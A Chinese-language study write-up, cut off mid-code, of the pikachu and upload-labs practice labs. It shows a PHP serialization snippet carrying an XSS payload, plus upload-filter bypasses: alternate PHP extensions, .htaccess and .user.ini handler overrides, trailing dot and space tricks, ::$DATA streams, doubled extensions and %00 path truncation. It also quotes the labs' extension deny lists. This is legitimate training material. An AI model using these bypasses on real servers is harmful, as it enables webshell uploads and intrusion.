alt="null"></p><p>导致问题是因为一些魔法函数</p><p>construct创建<br>destruct销毁,运行结束就销毁<br>tostring当作字符串<br>sleep</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">s</span>();  </span><br><span class="line"><span class="variable">$s</span>-&gt;test = <span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>跨站请求伪造<br>vince&#x2F;allen&#x2F;kobe&#x2F;grady&#x2F;kevin&#x2F;lucy&#x2F;lili,密码全部是123456<br>修改个人信息<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633682734-fbda8bef-0089-41d9-b64a-27ae9801057d.jpg" alt="null"></p><h1 id="uploads-labs"><a href="#uploads-labs" class="headerlink" title="uploads-labs"></a>uploads-labs</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p>前端js校验<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765972093170-28419f9a-793b-4fed-acf3-e789c934cc0d.png" alt="null"></p><p>复制下面的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后改加一个允许php,在终端跑一下就可以了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif|.php&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就可以上传了</p><p>方法二：<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765972093296-38dc3d79-8013-4279-b81f-7662297cbcfc.png" alt="null"></p><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765972093353-eb840680-c6dd-4802-8711-16774629863d.png" alt="null"></p><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>这次使用了黑名单后端过滤</p><p>并且还会对上传的文件重命名<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972093430-3c77c820-6809-4040-9767-35ff154f1aea.jpg" alt="null"></p><p>尝试其他php后缀</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.php3</span><br><span class="line">.php4</span><br><span class="line">.php5</span><br><span class="line">.php7</span><br><span class="line">.phps</span><br><span class="line">.php-s</span><br><span class="line">.pht</span><br><span class="line">.phar</span><br><span class="line">.phtml</span><br></pre></td></tr></table></figure><p>上传php5成功<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972093519-e29bd5a0-84dd-49b7-a0a9-2b7c3fef6325.jpg" alt="null"><br>在源代码看到上传路劲</p><p>蚁剑返回为空说明未被解析成功<br>不解析说明在appache的httpd.conf里面没有下面这一行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .php3 .php5 .phtml</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972093610-9591fbc7-37f1-4ea3-8a8c-2ad5552bbb73.jpg" alt="null"></p><p>我们这里如果不是本地的靶场就无法去修改这个文件</p><p>然后就可以了</p><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">创建.htaccess文件，代码如下：</span><br><span class="line"></span><br><span class="line">方法一：</span><br><span class="line">&lt;FilesMatch &quot;4.png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">#如果当前目录下有4.png，就会被解析为.php</span><br><span class="line"> </span><br><span class="line">方法二：</span><br><span class="line">AddType application/x-httpd-php .png</span><br><span class="line">#如果当前目录下有以.png结尾的文件，就会被解析为.php</span><br></pre></td></tr></table></figure><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p> 而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的php.ini，可以利用这个文件来构造后门和隐藏后门。<br>.user.ini使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.user.ini 配置项中有两个配置可以起到一些作用</span><br><span class="line">方法一：</span><br><span class="line">auto_prepend_file = &lt;filename&gt;         //包含在文件头</span><br><span class="line">方法二：</span><br><span class="line">auto_append_file = &lt;filename&gt;          //包含在文件尾</span><br></pre></td></tr></table></figure><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>文件大小写过滤不严谨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">大小写绕过原理：</span><br><span class="line">Windows系统下，对于文件名中的大小写不敏感。例如：test.php和TeSt.PHP是一样的。</span><br><span class="line">Linux系统下，对于文件名中的大小写敏感。例如：test.php和 TesT.php就是不一样的。</span><br></pre></td></tr></table></figure><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><p>发现没有对上传的文件名做去空格的操作-&gt;<code>trim()</code><br>利用burp抓包，修改对应的文件名 添加空格。<br><code>Windows系统下，对文件名中空格会被作为空处理，程序中的检测代码却不能自动删除空格。从而绕过黑名单.</code></p><h2 id="less-8-windows环境"><a href="#less-8-windows环境" class="headerlink" title="less-8(windows环境)"></a>less-8(windows环境)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>Windows 系统（NTFS&#x2F;FAT32&#x2F;ExFAT 等主流文件系统）的<strong>文件命名规范</strong> 中，存在一个关键设计：<br>不允许文件名 &#x2F; 文件后缀的末尾以英文句点（<code>.</code>）结尾，当系统处理以<code>.</code>结尾的文件名时，会<strong>自动截断末尾的所有句点</strong>（包括单个 &#x2F; 多个末尾点）。</p><p>然后去掉.<br>发现对上传的文件后缀名未做去点<code>.</code>的操作—&gt;<code>strrchr($file_name, &#39;.&#39;)</code><br>Windows系统下，文件后缀名最后一个点会被自动去除。上传 8.php.</p><h2 id="less-9-Windows环境"><a href="#less-9-Windows环境" class="headerlink" title="less-9(Windows环境)"></a>less-9(Windows环境)</h2><h2 id="Windows文件上传-DATA绕过上传"><a href="#Windows文件上传-DATA绕过上传" class="headerlink" title="Windows文件上传::$DATA绕过上传"></a>Windows文件上传::$DATA绕过上传</h2><p>NTFS数据流DATA<br>流类型<br>a.php::$DATA</p><p>黑名单没有包含</p><p>到Windows上传成功后会自动删除::$DATA<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972093685-91a26d84-014f-4465-9acd-de59202597e1.jpg" alt="null"></p><h2 id="less-10（Windows环境操作）"><a href="#less-10（Windows环境操作）" class="headerlink" title="less-10（Windows环境操作）"></a>less-10（Windows环境操作）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">       <span class="comment">#将文件名进行过滤操作后，将文件名拼接在路径后面，所以需要绕过前面的首尾去空以及去点。</span></span><br></pre></td></tr></table></figure><p>上传文件名为 .php. .(点+php+点+空格+点)</p><p><code>trim()</code>：仅删除<strong>字符串首尾</strong>的半角空格（U+0020）、\t、\n、\r，不处理点、中间空格；<br><code>deldot()</code>（常规实现）：仅循环删除<strong>文件名末尾</strong>的点（<code>.</code>），直到最后一个字符不是点为止；<br><code>strrchr($str, &#39;.&#39;)</code>：找字符串中「最后一个 <code>.</code>」，返回该点到字符串末尾的所有内容；<br>Windows 文件系统：强制规范化文件名 → 先删末尾所有空格 → 再删末尾所有点</p><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">代码分析：</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);<span class="comment">#将这些扩展名从文件名中移除</span></span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];     </span><br><span class="line"></span><br><span class="line">利用<span class="title function_ invoke__">str_ireplace</span>()将文件名中符合黑名单的字符串替换成空</span><br><span class="line">利用方式：利用双写黑名单字符，对字符串的一次过滤后拼接出php,文件名`.pphphp`</span><br></pre></td></tr></table></figure><p>str_ireplace函数的问题<br>直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.pphphp</span><br><span class="line">会匹配php删除掉</span><br></pre></td></tr></table></figure><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>前提需要php的版本号低于<code>5.3.29</code>，且<code>magic_quotes_gpc</code>为关闭状态（需要自己关闭）<br>去php.ini修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magic_quotes_gpc = Off</span><br></pre></td></tr></table></figure><p>上传图片分析数据包，使用白名单限制上传文件类型，但上传文件的存放路径可控<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972093773-ff6cf0eb-9154-47d1-a4d0-97603546dc58.jpg" alt="null"><br>利用方法：设置上传路径为<code>upload/12.php%00</code> ,添加<code>12.php%00</code>内容为了控制路径，上传文件后缀为白名单即可 例:12.png，保存后为<code>/upload/12.php%00*****.png</code>，但服务端读取到%00时会自动结束，将文件内容保存至12.php中<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972093842-7236ba53-db6b-4a25-b1cf-81b4f91daf35.jpg" alt="null"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">代码分析：</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span 